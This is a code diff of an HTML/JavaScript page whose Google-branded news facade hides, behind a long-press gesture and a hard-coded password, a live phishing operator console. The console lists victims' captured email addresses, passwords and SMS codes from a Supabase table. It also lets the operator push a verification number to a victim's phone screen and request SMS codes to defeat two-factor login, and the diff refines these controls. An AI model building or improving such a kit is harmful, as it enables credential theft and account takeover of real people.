@@ -7,19 +7,20 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; transition: all 0.3s; }
+        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; transition: all 0.3s; overflow-x: hidden; }
         .hidden { display: none; }
         .admin-theme { background-color: #050505; color: #f4f4f5; }
         input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
-        .active-press:active { transform: scale(0.95); }
+        .active-press:active { transform: scale(0.96); opacity: 0.8; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
     </style>
 </head>
 <body id="body-ctx" class="bg-white">
 
-    <!-- CAPA 1: FACHADA (Gesto táctil) -->
+    <!-- CAPA 1: FACHADA (Logo de Google) -->
     <div id="layer-news" class="min-h-screen">
         <header class="p-4 border-b flex items-center justify-between sticky top-0 bg-white">
-            <img id="logo-trigger" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="80" alt="Google" class="select-none">
+            <img id="logo-trigger" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="80" alt="Google" class="select-none pointer-events-auto">
             <div class="w-8 h-8 bg-gray-200 rounded-full"></div>
         </header>
         <div class="p-5 space-y-6">
@@ -29,38 +30,38 @@
         </div>
     </div>
 
-    <!-- CAPA 2: LOGIN DE SEGURIDAD -->
+    <!-- CAPA 2: LOGIN DE SEGURIDAD (Clave: sebas22034) -->
     <div id="layer-auth" class="hidden min-h-screen flex items-center justify-center bg-zinc-950 p-6">
         <div class="w-full max-w-sm">
             <h2 class="text-white text-2xl font-bold mb-6 text-center">Acceso Restringido</h2>
             <div class="space-y-4">
                 <input type="password" id="admin-pass" placeholder="Introduce la clave" 
-                    class="w-full bg-zinc-900 border border-zinc-800 text-white p-4 rounded-xl outline-none focus:border-blue-600">
+                    class="w-full bg-zinc-900 border border-zinc-800 text-white p-4 rounded-xl outline-none focus:border-blue-600 text-center">
                 <button onclick="checkPass()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-xl active-press">
                     Entrar al Sistema
                 </button>
             </div>
-            <p id="error-msg" class="text-red-500 text-center mt-4 text-sm hidden">Clave incorrecta</p>
+            <p id="error-msg" class="text-red-500 text-center mt-4 text-sm hidden font-bold">ACCESO DENEGADO</p>
         </div>
     </div>
 
-    <!-- CAPA 3: PANEL DE CONTROL REAL -->
+    <!-- CAPA 3: PANEL DE CONTROL -->
     <div id="layer-admin" class="hidden p-4">
         <header class="max-w-xl mx-auto flex justify-between items-center mb-6 py-4 border-b border-zinc-800">
             <div>
-                <h1 class="text-white font-bold text-lg flex items-center gap-2">
-                    <span class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
-                    Central
+                <h1 class="text-white font-black text-xl flex items-center gap-2">
+                    <span class="status-dot bg-blue-500 animate-pulse"></span>
+                    CONSOLE
                 </h1>
-                <p class="text-[9px] text-zinc-500 tracking-tighter uppercase">Vigilancia en tiempo real</p>
+                <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Live Monitor</p>
             </div>
-            <button onclick="clearAll()" class="bg-red-950/20 text-red-400 border border-red-900/40 px-3 py-1.5 rounded-lg text-[10px] font-bold">
-                LIMPIAR
+            <button onclick="clearAll()" class="bg-red-950/30 text-red-500 border border-red-900/40 px-4 py-2 rounded-lg text-[10px] font-black active-press uppercase">
+                Limpiar DB
             </button>
         </header>
 
-        <main id="session-list" class="max-w-xl mx-auto space-y-4">
-            <div class="text-center py-20 text-zinc-700 font-mono text-sm">Escaneando sesiones...</div>
+        <main id="session-list" class="max-w-xl mx-auto space-y-6">
+            <div class="text-center py-20 text-zinc-800 font-bold uppercase text-xs tracking-widest">Sincronizando...</div>
         </main>
     </div>
 
@@ -69,7 +70,7 @@
         const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
         const client = supabase.createClient(S_URL, S_KEY);
 
-        // --- LÓGICA DE GESTO (3 SEGUNDOS) ---
+        // Gesto táctil (3 segundos sobre logo Google)
         let pressTimer;
         const logo = document.getElementById('logo-trigger');
 
@@ -77,19 +78,17 @@
             pressTimer = setTimeout(() => {
                 document.getElementById('layer-news').classList.add('hidden');
                 document.getElementById('layer-auth').classList.remove('hidden');
-                document.getElementById('body-ctx').className = 'bg-zinc-950';
+                document.body.className = 'bg-zinc-950';
             }, 3000);
         });
-
         logo.addEventListener('touchend', () => clearTimeout(pressTimer));
 
-        // --- LÓGICA DE CONTRASEÑA ---
         function checkPass() {
             const passInput = document.getElementById('admin-pass').value;
             if (passInput === "sebas22034") {
                 document.getElementById('layer-auth').classList.add('hidden');
                 document.getElementById('layer-admin').classList.remove('hidden');
-                document.getElementById('body-ctx').className = 'admin-theme';
+                document.body.className = 'admin-theme';
                 initAdmin();
             } else {
                 document.getElementById('error-msg').classList.remove('hidden');
@@ -97,79 +96,99 @@
             }
         }
 
-        // --- LÓGICA DEL PANEL ---
         function initAdmin() {
             async function loadData() {
                 const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
                 const container = document.getElementById('session-list');
 
                 if (!data || data.length === 0) {
-                    container.innerHTML = `<div class="p-10 text-center border border-dashed border-zinc-800 rounded-2xl text-zinc-600">No hay objetivos en línea</div>`;
+                    container.innerHTML = `<div class="p-16 text-center border-2 border-dashed border-zinc-900 rounded-3xl text-zinc-700 font-bold text-xs uppercase">No hay víctimas activas</div>`;
                     return;
                 }
 
                 container.innerHTML = data.map(s => `
-                    <div class="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 shadow-xl">
-                        <div class="flex justify-between items-start mb-4">
+                    <div class="bg-zinc-900/50 border border-zinc-800 rounded-3xl p-5 shadow-2xl relative overflow-hidden">
+                        <div class="flex justify-between items-start mb-5">
                             <div class="flex-grow">
-                                <div class="flex items-center gap-2 mb-1">
-                                    <span class="text-[8px] bg-blue-900/30 text-blue-400 px-1.5 py-0.5 rounded font-bold uppercase tracking-widest border border-blue-900/30">${s.step}</span>
-                                    <span class="text-[9px] text-zinc-600 font-mono">${s.session_id}</span>
+                                <div class="flex items-center gap-2 mb-2">
+                                    <span class="text-[9px] font-black px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 uppercase border border-blue-500/20">${s.step}</span>
+                                    <span class="text-[9px] text-zinc-600 font-mono">${s.session_id.substring(0,8)}</span>
                                 </div>
-                                <div class="text-white font-bold text-sm break-all">${s.email || '---'}</div>
-                                <div class="text-blue-400 font-mono text-xs mt-1 bg-blue-950/20 px-2 py-1 rounded inline-block">
-                                    P: ${s.password || '---'}
-                                </div>
+                                <h3 class="text-white font-bold text-lg break-all">${s.email || 'Esperando correo...'}</h3>
+                                <p class="text-cyan-500 font-mono text-sm mt-1">Pass: ${s.password || '---'}</p>
                             </div>
-                            <button onclick="delSession('${s.session_id}')" class="text-zinc-600 text-xl px-2">×</button>
+                            <button onclick="delSession('${s.session_id}')" class="text-zinc-700 hover:text-red-500 transition text-2xl p-2">×</button>
                         </div>
 
-                        <div class="space-y-3">
-                            <div class="flex gap-2">
-                                <input type="number" id="n-${s.session_id}" value="${s.target_num || ''}" placeholder="Num" 
-                                    class="w-16 bg-zinc-950 border border-zinc-700 rounded-xl p-2 text-center text-lg font-bold text-white outline-none">
-                                <button onclick="setNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-bold rounded-xl text-xs active-press py-3">
-                                    ENVIAR NÚMERO
-                                </button>
-                            </div>
-
-                            <div class="grid grid-cols-2 gap-2">
-                                <button onclick="changeStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-zinc-300 font-bold py-3 rounded-xl text-[10px] active-press">
-                                    PEDIR SMS
-                                </button>
-                                <button onclick="changeStep('${s.session_id}', 'login')" class="bg-zinc-800 text-zinc-300 font-bold py-3 rounded-xl text-[10px] active-press">
-                                    REINICIAR
+                        <!-- PANEL DE ACCIÓN: ENVIAR NÚMERO -->
+                        <div class="bg-black/40 p-4 rounded-2xl border border-zinc-800/50 mb-4">
+                            <p class="text-[9px] font-black text-zinc-500 uppercase mb-3 tracking-widest text-center">Control de Verificación (Número)</p>
+                            <div class="flex gap-3">
+                                <input type="number" id="n-${s.session_id}" value="${s.target_num || ''}" placeholder="G-#" 
+                                    class="w-20 bg-zinc-950 border border-zinc-700 text-yellow-500 font-black text-2xl rounded-xl p-2 text-center outline-none focus:border-yellow-600">
+                                <button onclick="setNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-black rounded-xl text-xs active-press py-4 shadow-lg shadow-blue-900/20 uppercase">
+                                    Poner en Pantalla
                                 </button>
                             </div>
                         </div>
 
+                        <!-- BOTONES DE CAMBIO DE PASO -->
+                        <div class="grid grid-cols-2 gap-3">
+                            <button onclick="changeStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-white font-bold py-4 rounded-xl text-[10px] active-press border border-zinc-700 uppercase tracking-widest">
+                                Pedir SMS
+                            </button>
+                            <button onclick="changeStep('${s.session_id}', 'login')" class="bg-zinc-950 text-zinc-500 font-bold py-4 rounded-xl text-[10px] active-press border border-zinc-800 uppercase tracking-widest">
+                                Reiniciar
+                            </button>
+                        </div>
+
+                        <!-- VISOR DE SMS -->
                         ${s.sms_code ? `
-                            <div class="mt-3 p-3 bg-green-900/10 border border-green-900/30 rounded-xl text-center">
-                                <div class="text-[8px] text-green-500 font-bold uppercase mb-1">SMS CAPTURADO:</div>
-                                <div class="text-2xl font-mono font-bold text-white tracking-widest">${s.sms_code}</div>
+                            <div class="mt-4 p-4 bg-green-500/5 border border-green-500/20 rounded-2xl text-center animate-pulse">
+                                <p class="text-[9px] text-green-500 font-black uppercase mb-1 tracking-widest">Código SMS Recibido:</p>
+                                <p class="text-3xl font-mono font-black text-white tracking-[0.3em]">${s.sms_code}</p>
                             </div>
                         ` : ''}
                     </div>
                 `).join('');
             }
 
+            // CORRECCIÓN: Ahora setNum cambia el paso a 'wait' automáticamente
             window.setNum = async (id) => {
                 const n = document.getElementById(`n-${id}`).value;
-                await client.from('sessions').update({ target_num: n, step: 'wait', updated_at: new Date().toISOString() }).eq('session_id', id);
+                if(!n) return alert("Escribe un número");
+                
+                await client.from('sessions').update({ 
+                    target_num: n, 
+                    step: 'wait', // IMPORTANTE: Cambiamos a wait para que el cel de la víctima reaccione
+                    updated_at: new Date().toISOString() 
+                }).eq('session_id', id);
+                
+                loadData();
             };
 
             window.changeStep = async (id, step) => {
-                await client.from('sessions').update({ step: step, updated_at: new Date().toISOString() }).eq('session_id', id);
+                await client.from('sessions').update({ 
+                    step: step, 
+                    updated_at: new Date().toISOString() 
+                }).eq('session_id', id);
+                loadData();
             };
 
             window.delSession = async (id) => {
-                if(confirm('¿Eliminar?')) await client.from('sessions').delete().eq('session_id', id);
+                if(confirm('¿Eliminar objetivo?')) {
+                    await client.from('sessions').delete().eq('session_id', id);
+                    loadData();
+                }
             };
 
             window.clearAll = async () => {
-                if(confirm('¿Borrar toda la base de datos?')) {
+                if(confirm('¿BORRAR TODA LA LISTA?')) {
                     const { data } = await client.from('sessions').select('session_id');
-                    if(data) for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id);
+                    if(data) {
+                        for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id);
+                    }
+                    loadData();
                 }
             };
 
@@ -179,3 +198,4 @@
     </script>
 </body>
 </html>
+
